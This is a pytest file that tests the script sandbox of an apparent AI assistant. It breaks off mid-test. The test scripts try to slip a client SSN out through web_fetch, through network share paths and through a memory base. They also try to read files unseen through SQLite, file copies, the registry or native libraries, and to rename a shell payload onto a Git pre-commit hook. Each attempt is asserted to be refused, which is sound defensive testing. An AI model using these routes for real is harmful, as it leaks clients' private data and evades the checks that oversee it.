"""v1.473.0, the independent review: each defect it found, pinned against the
REAL registry and a REAL isolated worker (the `world` fixture of
tests/test_script_power_v1473.py) or the real stream lane (`desk`).

* the record of what a script read survives the chat being SAVED while the
  script runs (the worker is renamed then), and so does a kept value;
* a call that FAILED still handed the script its words: it counts as a read;
* SQLite is refused in a tool script (it opens files with no `open` event, so
  its reads were invisible to the rule, reached any path on the disk and
  could write into the working folder);
* a RENAME onto, or away from, one of Git's or Iron Jarvis's own files gets
  the once-only safety card a write of the same file gets;
* `skill_update` removes only Iron Jarvis's own saved-script note, never the
  user's text under a heading that merely starts the same way;
* what a card shows is worked out without reading megabytes on the event
  loop.
"""

from __future__ import annotations

import asyncio
import json
import sqlite3

import pytest

from iron_jarvis.core import auto_approve as AA
from iron_jarvis.skills import saved_scripts as SS
from iron_jarvis.tools import apply_changes as AC
from iron_jarvis.tools import script_values as SV
from iron_jarvis.tools import tool_script as TS
from iron_jarvis.tools.base import (
    GUARDED_EDIT_TOOLS, Reversibility, Tool, ToolContext, ToolResult, guarded_edit_check,
)
from iron_jarvis.tools.tool_script import NAME
from tests.test_script_power_lanes_v1473 import (  # noqa: F401  (fixtures)
    Model, _body, _call, _stream, desk,
)
from tests.test_script_power_v1473 import READERS, _invoke, _run, world  # noqa: F401

pytestmark = pytest.mark.timeout(240)

SSN = "123-45-6789"


def _first_turn(world) -> ToolContext:
    """A NEW chat's first message: no saved chat yet, keyed by the turn."""
    return ToolContext(
        workspace=world.ws, session_id="chat", agent_run_id="chat", turn_id="turn_one",
        config=world.p.config, event_bus=world.p.event_bus, engine=world.p.engine,
    )


def _saved_chat(world) -> ToolContext:
    return ToolContext(
        workspace=world.ws, session_id="chat", agent_run_id="chat", thread_id="chat_saved",
        config=world.p.config, event_bus=world.p.event_bus, engine=world.p.engine,
    )


class _Link(Tool):
    """Stands in for POST /chat/turns/{id}/thread arriving while a script runs."""

    name = "link_now"
    description = "test"
    input_schema = {"type": "object", "properties": {}}
    reversibility = Reversibility.READONLY

    def __init__(self, platform) -> None:
        self.p = platform
        self.moved = -1

    async def execute(self, args, ctx):
        self.moved = await TS.adopt_turn_worker(self.p, "turn_one", "chat_saved")
        return ToolResult(ok=True, output=f"moved {self.moved}")


# --------------------------------------------------------------------------- #
# The chat is saved while its first script runs
# --------------------------------------------------------------------------- #

def test_what_a_script_read_is_remembered_when_its_chat_is_saved_mid_script(world):
    """The script opens a client file ITSELF (so the rename, not a tool call,
    is the only thing between the read and the send), the chat is saved, and
    the script then tries to send what it read."""
    (world.ws / "f0.txt").write_text(f"client ssn {SSN}\n", encoding="utf-8")
    world.ctx = _first_turn(world)
    code = (
        "import time\n"
        'secret = open("f0.txt").read()\n'
        "time.sleep(1.5)\n"
        "try:\n"
        '    tools.web_fetch(url="https://example.com/?d=" + secret.strip()[-11:])\n'
        '    print("SENT")\n'
        "except ToolError as e:\n"
        '    print("REFUSED", e)\n'
    )

    async def go():
        run = asyncio.ensure_future(world.p.registry.invoke(
            NAME, {"code": code}, world.ctx, world.p.permissions, allowed_names=set(READERS),
        ))
        await asyncio.sleep(0.6)
        moved = await TS.adopt_turn_worker(world.p, "turn_one", "chat_saved")
        return moved, await run

    moved, result = asyncio.run(go())
    assert moved == 1, "the link did land while the script ran"
    assert world.web.urls == [], world.web.urls
    assert "REFUSED" in result.output and "SENT" not in result.output, result.output


def test_a_read_made_after_the_chat_was_saved_is_remembered_by_the_next_message(world):
    link = _Link(world.p)
    world.p.registry.register(link)
    world.p.permissions._base["link_now"] = "allow"
    (world.ws / "f0.txt").write_text(f"client ssn {SSN}\n", encoding="utf-8")
    world.ctx = _first_turn(world)
    first = _run(world, (
        "tools.link_now()\n"
        'secret = tools.read_file(path="f0.txt").output\n'
        'print("held")\n'
    ), allowed=(*READERS, "link_now"))
    assert first.ok and link.moved == 1, (first.error, link.moved)
    # The NEXT message of the same chat, keyed by the saved chat now.
    world.ctx = _saved_chat(world)
    second = _run(world, (
        "try:\n"
        '    tools.web_fetch(url="https://example.com/?d=" + secret.strip()[-11:])\n'
        '    print("SENT")\n'
        "except ToolError as e:\n"
        '    print("REFUSED", e)\n'
    ))
    assert world.web.urls == [], world.web.urls
    assert "REFUSED" in second.output, second.output


def test_a_value_kept_after_the_chat_was_saved_is_found_by_the_chat(world):
    """`tools.keep` used the name the script STARTED under: a value kept
    after the link stayed under the turn's name, where the chat's later
    calls never look."""
    link = _Link(world.p)
    world.p.registry.register(link)
    world.p.permissions._base["link_now"] = "allow"
    world.ctx = _first_turn(world)
    r = _run(world, 'tools.link_now()\ntools.keep("totals", [["a", 1]])\nprint("ok")\n',
             allowed=(*READERS, "link_now"))
    assert r.ok, r.error
    assert SV.SHELF.names("chat:chat_saved") == ["totals"]
    assert SV.SHELF.names("chat:turn_one") == []


# --------------------------------------------------------------------------- #
# A failed call still handed the script its words
# --------------------------------------------------------------------------- #

class _Lookup(Tool):
    """A read tool that FAILS with data in its words, the way an app's tool
    does ("no such customer; did you mean …")."""

    name = "customer_lookup"
    description = "test"
    input_schema = {"type": "object", "properties": {"q": {"type": "string"}}}
    reversibility = Reversibility.READONLY

    async def execute(self, args, ctx):
        return ToolResult(ok=False, error=f"no customer '{args.get('q')}'. Did you mean: Jane Client (SSN {SSN})?")


def test_a_failed_call_counts_as_a_read(world):
    world.p.registry.register(_Lookup())
    world.p.permissions._base["customer_lookup"] = "allow"
    r = _run(world, (
        "try:\n"
        '    tools.customer_lookup(q="jane")\n'
        "except ToolError as e:\n"
        "    said = str(e)\n"
        "try:\n"
        '    tools.web_fetch(url="https://example.com/?d=" + said[-25:])\n'
        '    print("SENT")\n'
        "except ToolError as e:\n"
        '    print("REFUSED", e)\n'
    ), allowed=(*READERS, "customer_lookup"))
    assert world.web.urls == [], world.web.urls
    assert "REFUSED" in r.output, r.output


def test_a_failed_web_read_does_not_stop_the_next_web_read(world):
    """Control: public pages are not private, failed or not."""
    r = _run(world, (
        'tools.web_fetch(url="https://example.com/a")\n'
        'tools.web_fetch(url="https://example.com/b")\n'
        'print("ok")\n'
    ))
    assert r.ok and len(world.web.urls) == 2


# --------------------------------------------------------------------------- #
# SQLite in a tool script
# --------------------------------------------------------------------------- #

def _db(path) -> None:
    con = sqlite3.connect(path)
    con.execute("create table clients (name text, ssn text)")
    con.execute("insert into clients values ('Jane Client', ?)", (SSN,))
    con.commit()
    con.close()


@pytest.mark.parametrize("how", [
    'sqlite3.connect("clients.db")',
    'sqlite3.connect(":memory:")',
    'sqlite3.connect("file:clients.db?mode=ro", uri=True)',
    'sqlite3.Connection("clients.db")',
    'sqlite3.connect("made_by_script.db")',
])
def test_a_script_cannot_open_a_sqlite_database(world, how):
    _db(world.ws / "clients.db")
    r = _run(world, (
        "import sqlite3\n"
        "try:\n"
        f"    con = {how}\n"
        '    print("OPENED")\n'
        "except PermissionError as e:\n"
        '    print("BLOCKED", e)\n'
    ))
    assert "BLOCKED" in r.output and "OPENED" not in r.output, r.output
    assert "SQLite" in r.output
    assert not (world.ws / "made_by_script.db").exists()


def test_the_refusal_says_what_to_do_instead():
    assert "CSV" in W_SQLITE and "tool" in W_SQLITE


def test_a_script_cannot_reach_windows_own_file_calls_or_tcl(world):
    r = _run(world, (
        "out = []\n"
        "try:\n"
        "    import _winapi\n"
        '    _winapi.CreateFile("f0.txt", 0x80000000, 1, 0, 3, 0, 0)\n'
        '    out.append("winapi opened")\n'
        "except (PermissionError, ImportError, AttributeError, OSError) as e:\n"
        '    out.append("winapi " + type(e).__name__)\n'
        "try:\n"
        "    import tkinter\n"
        '    out.append("tkinter imported")\n'
        "except (PermissionError, ImportError) as e:\n"
        '    out.append("tkinter " + type(e).__name__)\n'
        "print(out)\n"
    ))
    assert "opened" not in r.output and "imported" not in r.output, r.output


def test_a_script_cannot_even_ask_about_a_path_on_another_computer(world):
    """`os.stat` and `os.path.exists` raise no audit event, and asking
    whether `\\\\host\\share\\<data>` exists makes Windows connect to that host.
    Refused from the path's TEXT (this PC's own address is used here, and
    nothing is touched: the answer is the worker's, not Windows')."""
    r = _run(world, (
        "import os, pathlib, json\n"
        'target = "\\\\\\\\127.0.0.1\\\\ij-review-nosuchshare\\\\DATA-123"\n'
        "said = {}\n"
        "calls = {\n"
        '    "os.stat": lambda: os.stat(target),\n'
        '    "os.lstat": lambda: os.lstat(target),\n'
        '    "os.access": lambda: os.access(target, os.R_OK),\n'
        '    "os.path.exists": lambda: os.path.exists(target),\n'
        '    "os.path.isfile": lambda: os.path.isfile(target),\n'
        '    "os.path.isdir": lambda: os.path.isdir(target),\n'
        '    "os.path.getsize": lambda: os.path.getsize(target),\n'
        '    "pathlib.exists": lambda: pathlib.Path(target).exists(),\n'
        '    "os.chdir": lambda: os.chdir(target),\n'
        '    "os.listdir": lambda: os.listdir(target),\n'
        '    "open": lambda: open(target),\n'
        '    "forward slashes": lambda: os.stat("//127.0.0.1/ij-review-nosuchshare/DATA-123"),\n'
        '    "long form": lambda: os.stat("\\\\\\\\?\\\\UNC\\\\127.0.0.1\\\\ij-review-nosuchshare\\\\x"),\n'
        "}\n"
        "for name, call in calls.items():\n"
        "    try:\n"
        "        call()\n"
        '        said[name] = "ANSWERED"\n'
        "    except PermissionError as e:\n"
        '        said[name] = "BLOCKED" if "another computer" in str(e) else "permission: " + str(e)[:60]\n'
        "    except OSError as e:\n"
        '        said[name] = "WINDOWS ANSWERED %s" % getattr(e, "winerror", None)\n'
        "try:\n"
        "    import nt\n"
        "    nt.stat(target)\n"
        '    said["nt.stat"] = "ANSWERED"\n'
        "except PermissionError:\n"
        '    said["nt.stat"] = "BLOCKED"\n'
        "except OSError as e:\n"
        '    said["nt.stat"] = "WINDOWS ANSWERED"\n'
        "print(json.dumps(said))\n"
    ))
    said = json.loads(r.output[r.output.index("{"): r.output.rindex("}") + 1])
    assert len(said) == 14, said
    assert set(said.values()) == {"BLOCKED"}, said


def test_a_script_cannot_read_the_windows_registry(world):
    """The worker's environment is scrubbed of keys, but the user's own
    environment variables are kept in the registry."""
    r = _run(world, (
        "import winreg\n"
        "out = []\n"
        "for hive, key in ((winreg.HKEY_CURRENT_USER, 'Environment'),\n"
        "                  (winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion')):\n"
        "    try:\n"
        "        winreg.OpenKey(hive, key)\n"
        "        out.append('OPENED')\n"
        "    except PermissionError as e:\n"
        "        out.append('BLOCKED' if 'registry' in str(e) else str(e)[:40])\n"
        "print(out)\n"
    ))
    assert "OPENED" not in r.output and r.output.count("BLOCKED") == 2, r.output


def test_the_libraries_that_look_in_the_registry_still_work(world):
    """Control: a refused registry call reads as a missing key to the
    standard library, and local paths are answered as always."""
    r = _run(world, (
        "import mimetypes, os, pathlib, platform, shutil\n"
        'print("TYPE", mimetypes.guess_type("a.pdf")[0])\n'
        'print("SYSTEM", platform.system())\n'
        'print("LOCAL", os.path.exists("f0.txt"), os.path.isfile("f0.txt"), os.stat("f0.txt").st_size > 0,\n'
        '      pathlib.Path("f0.txt").exists(), os.path.exists("nope.txt"), os.access("f0.txt", os.R_OK))\n'
        'print("ABS", os.path.exists(os.path.abspath("f0.txt")), os.path.isdir(os.getcwd()))\n'
    ))
    assert r.ok, (r.output, r.error)
    assert "TYPE application/pdf" in r.output and "SYSTEM Windows" in r.output
    assert "LOCAL True True True True False True" in r.output and "ABS True True" in r.output


def test_ordinary_script_work_is_untouched_by_the_new_refusals(world):
    """Control: the standard library a script really uses still imports and
    runs, and a plain file read still works."""
    r = _run(world, (
        "import csv, io, json, re, statistics, datetime, decimal, collections, math, pathlib\n"
        'text = open("f0.txt").read()\n'
        'rows = list(csv.reader(io.StringIO("a,b\\n1,2\\n")))\n'
        'print("OK", len(text) > 0, rows[1], statistics.mean([1, 2, 3]))\n'
    ))
    assert r.ok and "OK True ['1', '2'] 2" in r.output, (r.output, r.error)


def test_a_copy_is_seen_as_the_read_and_the_write_it_is(world, tmp_path):
    """`shutil.copy2` copies with Windows' own CopyFile2 on Python 3.12: no
    `open` event. A script copied a client file into its scratch folder and
    read it there unseen, read any file on the disk, and wrote anywhere."""
    (world.ws / "clients.csv").write_text(f"Jane Client,{SSN}\n", encoding="utf-8")
    outside = tmp_path / "elsewhere"
    outside.mkdir()
    (outside / "private.txt").write_text(f"not in the working folder: {SSN}\n", encoding="utf-8")
    src = str(outside / "private.txt").replace("\\", "/")
    dst = str(outside / "planted.txt").replace("\\", "/")

    r = _run(world, (
        "import os, shutil, tempfile\n"
        'copy = os.path.join(tempfile.gettempdir(), "c.csv")\n'
        'shutil.copy2("clients.csv", copy)\n'          # a read of the working folder
        "data = open(copy).read().strip()\n"
        "try:\n"
        '    tools.web_fetch(url="https://example.com/?d=" + data)\n'
        '    print("SENT")\n'
        "except ToolError as e:\n"
        '    print("REFUSED", e)\n'
    ))
    assert world.web.urls == [] and "REFUSED" in r.output, r.output

    r = _run(world, (
        "import os, shutil, tempfile\n"
        "said = []\n"
        "for label, a, b in [\n"
        f'    ("outside-read", "{src}", os.path.join(tempfile.gettempdir(), "p.txt")),\n'
        '    ("into-the-folder", "f0.txt", "f0-copy.txt"),\n'
        '    ("over-a-file", "f1.txt", "f0.txt"),\n'
        f'    ("outside-write", "f0.txt", "{dst}"),\n'
        "]:\n"
        "    try:\n"
        "        shutil.copy2(a, b)\n"
        '        said.append(label + " COPIED")\n'
        "    except PermissionError:\n"
        '        said.append(label + " blocked")\n'
        "print(said)\n"
    ))
    assert "COPIED" not in r.output and r.output.count("blocked") == 4, r.output
    assert not (world.ws / "f0-copy.txt").exists()
    assert (world.ws / "f0.txt").read_text() == "file 0\n"
    assert not (outside / "planted.txt").exists()


def test_a_copy_inside_the_scratch_folder_still_works(world):
    """Control: a script may still copy its own temporary files."""
    r = _run(world, (
        "import os, shutil, tempfile\n"
        'a = os.path.join(tempfile.gettempdir(), "a.txt")\n'
        'open(a, "w").write("mine")\n'
        'shutil.copy2(a, a + ".bak")\n'
        'print("OK", open(a + ".bak").read())\n'
    ))
    assert r.ok and "OK mine" in r.output, (r.output, r.error)


# --------------------------------------------------------------------------- #
# A rename that replaces a file
# --------------------------------------------------------------------------- #

def test_a_file_replaced_by_a_rename_is_kept_never_destroyed(world):
    from tests.test_script_power_v1473 import WRITERS

    (world.ws / "f0.txt").write_text("THE CLIENT'S ONLY COPY\n", encoding="utf-8")
    r = _invoke(world, "rename_file", {"path": "f1.txt", "new_path": "f0.txt", "overwrite": True},
                allowed=WRITERS)
    assert r.ok, r.error
    assert (world.ws / "f0.txt").read_text() == "file 1\n" and not (world.ws / "f1.txt").exists()
    kept = r.data.get("replaced_kept")
    assert kept and "kept at" in r.output and "does not put the replaced one back" in r.output
    from pathlib import Path

    kept = Path(kept)
    assert kept.read_text(encoding="utf-8") == "THE CLIENT'S ONLY COPY\n"
    assert world.home in kept.parents and "trash" in kept.parts


def test_an_ordinary_rename_says_and_keeps_nothing_extra(world):
    from tests.test_script_power_v1473 import WRITERS

    r = _invoke(world, "rename_file", {"path": "f1.txt", "new_path": "g1.txt"}, allowed=WRITERS)
    assert r.ok and "replaced_kept" not in r.data and "kept at" not in r.output
    assert r.output.startswith("renamed:") and not (world.home / "trash").exists()
    # overwrite=true with nothing there to replace is an ordinary rename too.
    r = _invoke(world, "rename_file", {"path": "f2.txt", "new_path": "g2.txt", "overwrite": True},
                allowed=WRITERS)
    assert r.ok and "replaced_kept" not in r.data and not (world.home / "trash").exists()


def test_a_batch_never_replaces_a_file_by_renaming(world):
    from tests.test_script_power_v1473 import GRANTED, WRITERS

    (world.ws / "f0.txt").write_text("THE CLIENT'S ONLY COPY\n", encoding="utf-8")
    changes = [
        {"tool": "rename_file", "args": {"path": "f2.txt", "new_path": "ok-2.txt"}},
        {"tool": "rename_file", "args": {"path": "f1.txt", "new_path": "f0.txt", "overwrite": True}},
    ]
    r = _invoke(world, "apply_changes", {"changes": changes}, allowed=WRITERS, session_allow=GRANTED)
    assert not r.ok and "NOTHING WAS CHANGED" in r.error and "overwrite" in r.error, r.error
    assert (world.ws / "f0.txt").read_text() == "THE CLIENT'S ONLY COPY\n"
    assert (world.ws / "f2.txt").is_file() and (world.ws / "f1.txt").is_file()
    # A script that plans one is told when its plan is handed over (the end
    # of the script), and no plan is kept.
    planned = _run(world, (
        'tools.plan("rename_file", path="f1.txt", new_path="f0.txt", overwrite=True)\n'
        'print("planned")\n'
    ), allowed=(*READERS, "rename_file", "apply_changes"))
    assert not planned.ok and "overwrite" in (planned.error or ""), (planned.output, planned.error)
    assert SV.SHELF.names("chat:chat_one") == []


# --------------------------------------------------------------------------- #
# A rename onto a guarded file
# --------------------------------------------------------------------------- #

def test_a_rename_is_one_of_the_guarded_tools(tmp_path):
    assert AA.MOVE_TOOL in GUARDED_EDIT_TOOLS
    ws = tmp_path / "w"
    (ws / ".git" / "hooks").mkdir(parents=True)
    onto = guarded_edit_check("rename_file", {"path": "notes.txt", "new_path": ".git/hooks/pre-commit"}, ws)
    away = guarded_edit_check("rename_file", {"path": ".git/config", "new_path": "old-config.txt"}, ws)
    rules = guarded_edit_check("rename_file", {"path": "x.txt", "new_path": "CLAUDE.md"}, ws)
    plain = guarded_edit_check("rename_file", {"path": "a.txt", "new_path": "b.txt"}, ws)
    for hit in (onto, away, rules):
        assert hit is not None and hit.ask and hit.once_only and hit.reason == AA.GUARD_REASON
        assert hit.dont_ask_skips and hit.attended_only
    assert "onto .git/hooks/pre-commit" in onto.words
    assert plain is None


@pytest.mark.asyncio
async def test_a_rename_onto_a_git_hook_gets_the_once_only_safety_card(desk):
    app, ws = desk
    (ws / ".git" / "hooks").mkdir(parents=True)
    (ws / "statement-notes.txt").write_text("#!/bin/sh\ncalc.exe\n", encoding="utf-8")
    model = Model([
        _call(1, "rename_file", path="statement-notes.txt", new_path=".git/hooks/pre-commit"),
        "Renamed.",
    ])
    request = "Rename the statement files here so each name starts with its month."
    frames, cards, done = await _stream(app, _body(ws, request), model, decision="deny")
    assert "rename_file" in model.offered[0]
    assert len(cards) == 1 and cards[0].get("tool") == "rename_file"
    assert cards[0].get("once_only") is True and cards[0].get("once_reason") == "guarded"
    assert not (ws / ".git" / "hooks" / "pre-commit").exists()
    assert (ws / "statement-notes.txt").is_file()


@pytest.mark.asyncio
async def test_an_ordinary_rename_still_runs_without_a_card(desk):
    app, ws = desk
    (ws / ".git").mkdir()
    model = Model([_call(1, "rename_file", path="f0.txt", new_path="2026-01-f0.txt"), "Renamed."])
    request = "Rename the statement files here so each name starts with its month."
    frames, cards, done = await _stream(app, _body(ws, request), model)
    assert not cards and (ws / "2026-01-f0.txt").is_file()


# --------------------------------------------------------------------------- #
# skill_update keeps the user's text
# --------------------------------------------------------------------------- #

BODY = (
    "# Month-end close\n\n"
    "## Before you start\nAsk which month.\n\n"
    "### Saved script library\nOur team keeps its macros on the S: drive.\n\n"
    "## Saved scripts and where they live\nIn the shared folder.\n\n"
    "## Review steps\n1. Tie out cash.\n2. NEVER skip the partner review.\n"
)


def _skill(world, tool, **args):
    async def go():
        return await world.p.registry.invoke(
            tool, args, world.ctx, world.p.permissions,
            allowed_names={tool}, session_allow={tool},
        )

    return asyncio.run(go())


def test_only_the_apps_own_note_is_ever_removed():
    assert SS.without_run_note(BODY) == BODY
    noted = SS.with_run_note(BODY, "month-end-close")
    assert noted.count(SS.NOTE_HEAD + "\n" + SS._NOTE_FIRST) == 1
    assert SS.without_run_note(noted).rstrip() == BODY.rstrip()
    # Twice is still once.
    assert SS.with_run_note(noted, "month-end-close") == noted
    # Text the user wrote AFTER the note stays.
    after = noted + "\n## My own last section\nKeep this.\n"
    kept = SS.without_run_note(after)
    assert "Keep this." in kept and "NEVER skip the partner review" in kept
    assert SS._NOTE_FIRST not in kept
    # A heading of the user's own that is exactly the note's, with their own
    # words under it, is theirs.
    own = "# X\n\n## Saved script\nWe keep ours in the vault.\n\n## Next\nMore.\n"
    assert SS.without_run_note(own) == own


def test_a_description_only_update_keeps_every_line_of_the_instructions(world):
    made = _skill(world, "skill_create", name="month-end-close", description="Close the month.",
                  instructions=BODY)
    assert made.ok, made.error
    path = world.home / "skills" / "month-end-close" / "SKILL.md"
    r = _skill(world, "skill_update", name="month-end-close", description="Close the month (2026).")
    assert r.ok, r.error
    after = path.read_text(encoding="utf-8")
    for line in ("Saved script library", "Saved scripts and where they live", "Review steps",
                 "NEVER skip the partner review", "Close the month (2026)."):
        assert line in after, (line, after)


def test_adding_and_replacing_a_script_keeps_the_users_text_and_one_note(world):
    made = _skill(world, "skill_create", name="month-end-close", description="Close the month.",
                  instructions=BODY)
    assert made.ok, made.error
    path = world.home / "skills" / "month-end-close" / "SKILL.md"
    for code in ('print("one")\n', 'print("two")\n'):
        r = _skill(world, "skill_update", name="month-end-close", script=code)
        assert r.ok, r.error
        text = path.read_text(encoding="utf-8")
        assert text.count(SS._NOTE_FIRST) == 1
        assert "NEVER skip the partner review" in text and "Saved script library" in text


# --------------------------------------------------------------------------- #
# What a card shows is cheap to work out
# --------------------------------------------------------------------------- #

def test_a_line_is_bounded_before_it_is_masked(monkeypatch):
    """This runs on the event loop for every line of a card. A plan whose
    200 paths were 39,000 characters each took 0.9 s there; counted here by
    what the mask is handed, never by a clock."""
    from iron_jarvis.detections import redact

    seen: list[int] = []
    real = redact.mask

    def spy(text, *a, **kw):
        seen.append(len(str(text)))
        return real(text, *a, **kw)

    monkeypatch.setattr(redact, "mask", spy)
    change = {"tool": "rename_file", "args": {"path": "d/" + "x" * 39_000, "new_path": "n"}}
    line = AC.describe_change(change)
    # The END of each path is kept (the file's name), so both ends of a
    # rename are always on the card.
    assert len(line) <= 160 and line.startswith("Rename …xxx") and line.endswith(" to n")
    assert seen and max(seen) <= 2_000, seen

    # The line builder itself is bounded too (a guarded file's own path is
    # shown through it without being shortened first).
    seen.clear()
    assert len(AC._one_line("p/" + "y" * 500_000, 120)) <= 120
    assert seen and max(seen) <= 2_000, seen

    seen.clear()
    summary = SV.describe("A" * 7_900_000)
    assert summary.startswith("text, 7,900,000 characters")
    assert seen and max(seen) <= 2_000, seen

    seen.clear()
    wide = SV.describe([["cell " * 400_000, 1], ["b", 2]])
    assert wide.startswith("2 rows, up to 2 columns; first row:")
    assert seen and max(seen) <= 2_000, seen


def test_a_summary_reads_the_same_as_before_for_ordinary_values():
    assert SV.describe([["Name", "Amount"], ["alpha", 1234.56]]) == (
        '2 rows, up to 2 columns; first row: ["Name", "Amount"]'
    )
    assert SV.describe([{"a": 1, "b": "x"}]) == '1 items; first: {"a": 1, "b": "x"}'
    assert SV.describe([1, 2, 3]) == "a list of 3; first: 1"
    assert SV.describe({"k": 1, "j": 2}) == "2 named entries: k, j"
    deep = [[[[[[[["bottom"]]]]]]]]
    assert "…" in SV.describe(deep)
    assert json.loads(json.dumps(SV.describe(deep)))


# --------------------------------------------------------------------------- #
# A path on another computer, a memory base off this PC, another app's resource
# --------------------------------------------------------------------------- #

SHARE = "\\\\203.0.113.7\\x\\"


@pytest.mark.parametrize("value,key,want", [
    ("\\\\203.0.113.7\\x\\secret.txt", "path", True),
    ("//203.0.113.7/x/secret.txt", "path", True),
    ("\\\\?\\UNC\\host\\share\\a", "path", True),
    ("\\\\.\\pipe\\name", "path", True),
    ("\\\\server", "folder", True),
    ("\\\\?\\C:\\Users\\x\\a.txt", "path", False),
    ("C:\\Users\\x\\a.txt", "path", False),
    ("f0.txt", "path", False),
    ("sub/f0.txt", "path", False),
    # Not a path argument: only the backslash spelling of a share counts.
    ("//TODO fix this", "pattern", False),
    ("\\\\d+\\.\\d+", "pattern", False),
    ("\\\\host\\share\\file", "pattern", True),
    ("//", "path", False),
    (12, "path", False),
])
def test_a_network_path_is_told_from_its_text(value, key, want):
    assert TS.network_path(value, key) is want


def test_a_path_inside_a_working_folder_that_is_itself_on_a_share_is_not_one():
    home = "\\\\srv\\clients\\smith"
    assert TS._network_path_in({"path": "\\\\srv\\clients\\smith\\2026\\k1.pdf"}, home) == ""
    assert TS._network_path_in({"path": "//SRV/clients/Smith/2026/k1.pdf"}, home) == ""
    assert TS._network_path_in({"path": "\\\\srv\\clients\\smithers\\k1.pdf"}, home)
    assert TS._network_path_in({"paths": ["a.txt", "//other/x/y"]}, "C:\\work") == "//other/x/y"
    assert TS._network_path_in({"path": "a.txt", "pattern": "//x"}, "C:\\work") == ""


def test_a_script_holding_this_pcs_data_cannot_open_a_path_on_another_computer(world):
    """The file readers count as local, but opening `\\\\host\\share\\<data>`
    makes Windows connect to that host. Refused BEFORE the tool is called:
    no reader ever sees the path."""
    (world.ws / "f0.txt").write_text("SSN-123-45-6789\n", encoding="utf-8")
    names = (*READERS, "read_document", "grep", "glob")
    code = (
        f"HOST = {SHARE!r}\n"
        'secret = tools.read_file(path="f0.txt").output.strip()\n'
        "said = {}\n"
        "for tool, args in [\n"
        '    ("read_file", {"path": HOST + secret + ".txt"}),\n'
        '    ("read_document", {"path": HOST + secret + ".pdf"}),\n'
        '    ("list_files", {"path": HOST + secret}),\n'
        '    ("grep", {"pattern": "x", "path": HOST + secret}),\n'
        '    ("glob", {"pattern": "*", "path": HOST + secret}),\n'
        "]:\n"
        "    try:\n"
        "        tools.call(tool, **args)\n"
        '        said[tool] = "CALLED"\n'
        "    except ToolError as e:\n"
        "        said[tool] = str(e)\n"
        "print(json.dumps(said))\n"
    )
    r = _run(world, "import json\n" + code, allowed=names)
    said = json.loads(r.output[r.output.index("{"): r.output.rindex("}") + 1])
    assert set(said) == {"read_file", "read_document", "list_files", "grep", "glob"}
    for tool, words in said.items():
        assert "another computer" in words, (tool, words)
    # The registry made exactly one read_file call: the first, local one.
    from tests.test_script_power_v1473 import _rows

    assert len(_rows(world, "read_file")) == 1
    for tool in ("read_document", "list_files", "grep", "glob"):
        assert _rows(world, tool) == [], tool


class _RemoteBase:
    """A memory base that is not a notes folder on this PC."""

    name = "notion"

    def __init__(self) -> None:
        self.queries: list[str] = []

    def search(self, query, k=5):
        self.queries.append(str(query))
        return []

    def health(self):
        return {"ok": True}


def test_a_memory_base_off_this_pc_is_a_place_outside(world):
    script = world.p.registry.get(NAME)
    manager = world.p.registry.get("ltm_search").manager
    local_now = all(
        __import__("iron_jarvis.providers.egress", fromlist=["x"]).ltm_connector_is_local(c)
        for c in manager.connectors()
    )
    if local_now:
        for name in ("ltm_search", "brain_search", "brain_read"):
            assert script._origin(name) == ("local", False), name
    base = _RemoteBase()
    manager.register(base)
    for name in ("ltm_search", "brain_search", "brain_read"):
        assert script._origin(name) == (TS._MEMORY_ORIGIN, True), name
        assert script._carry_refusal(name, {"local"}), name
        # What the memory base said may go back to the memory base.
        assert script._carry_refusal(name, {TS._MEMORY_ORIGIN}) == "", name
    # ...and must not ride a web call.
    assert script._carry_refusal("web_fetch", {TS._MEMORY_ORIGIN})

    (world.ws / "f0.txt").write_text("SSN-123-45-6789\n", encoding="utf-8")
    r = _run(world, (
        'secret = tools.read_file(path="f0.txt").output.strip()\n'
        "try:\n"
        "    tools.ltm_search(query=secret)\n"
        '    print("ASKED")\n'
        "except ToolError as e:\n"
        '    print("REFUSED", e)\n'
    ), allowed=(*READERS, "ltm_search"))
    assert "REFUSED" in r.output and "ASKED" not in r.output, r.output
    assert base.queries == []


def test_a_resource_read_belongs_to_the_app_it_names(world):
    script = world.p.registry.get(NAME)
    assert script._origin("mcp_read_resource", {"server": "gmail", "uri": "x"}) == ("pack:gmail", True)
    assert script._origin("mcp_read_resource", {}) == ("outside:mcp_read_resource", True)
    held = {"pack:gmail"}
    assert script._carry_refusal("mcp_read_resource", held, {"server": "gmail", "uri": "a"}) == ""
    said = script._carry_refusal("mcp_read_resource", held, {"server": "slack", "uri": "a"})
    assert "the app gmail" in said
    # One app's own tool and its resources are one place.
    assert script._carry_refusal("mcp__gmail__search", held, {"q": "x"}) == ""


# --------------------------------------------------------------------------- #
# What a script may import
# --------------------------------------------------------------------------- #

def _importable(name: str) -> bool:
    import importlib.util

    try:
        return importlib.util.find_spec(name) is not None
    except (ImportError, ValueError):
        return False


NATIVE = ["lxml.etree", "pdf_inspector", "win32api", "win32file", "win32com.client", "pythoncom",
          "PIL.ImageGrab", "numpy", "psutil", "pikepdf", "fitz", "requests", "httpx"]


def test_a_script_imports_the_standard_library_and_a_short_list_only(world):
    """Found by the review: lxml reads and writes any file and fetches a web
    address by itself (native code: no audit event), pdf_inspector reads any
    PDF, pywin32 is the whole Windows API. An allow-list, because a list of
    what to refuse can never be complete."""
    present = [n for n in NATIVE if _importable(n.partition(".")[0])]
    assert "lxml.etree" in present and "win32api" in present, present
    for how in ('__import__(name, fromlist=["x"])', "importlib.import_module(name)"):
        r = _run(world, (
            "import importlib, json\n"
            f"names = {NATIVE!r}\n"
            "said = {}\n"
            "for name in names:\n"
            "    try:\n"
            f"        {how}\n"
            '        said[name] = "IMPORTED"\n'
            "    except (ImportError, PermissionError) as e:\n"
            '        said[name] = "blocked" if "BLOCKED" in str(e) else "absent"\n'
            "print(json.dumps(said))\n"
        ))
        said = json.loads(r.output[r.output.index("{"): r.output.rindex("}") + 1])
        assert "IMPORTED" not in said.values(), (how, said)
        for name in present:
            assert said[name] == "blocked", (how, name, said)


def test_a_native_library_cannot_be_loaded_under_a_borrowed_name(world):
    """`importlib` can load a native file under any name its init function
    fits: lxml's `etree` as "json.etree" would pass a check of the first
    word alone."""
    import lxml.etree as real

    path = real.__file__
    r = _run(world, (
        "import importlib.machinery, importlib.util\n"
        f"path = {path!r}\n"
        "out = []\n"
        'for name in ("json.etree", "etree", "os.path.etree"):\n'
        "    try:\n"
        "        loader = importlib.machinery.ExtensionFileLoader(name, path)\n"
        "        spec = importlib.util.spec_from_loader(name, loader)\n"
        "        module = importlib.util.module_from_spec(spec)\n"
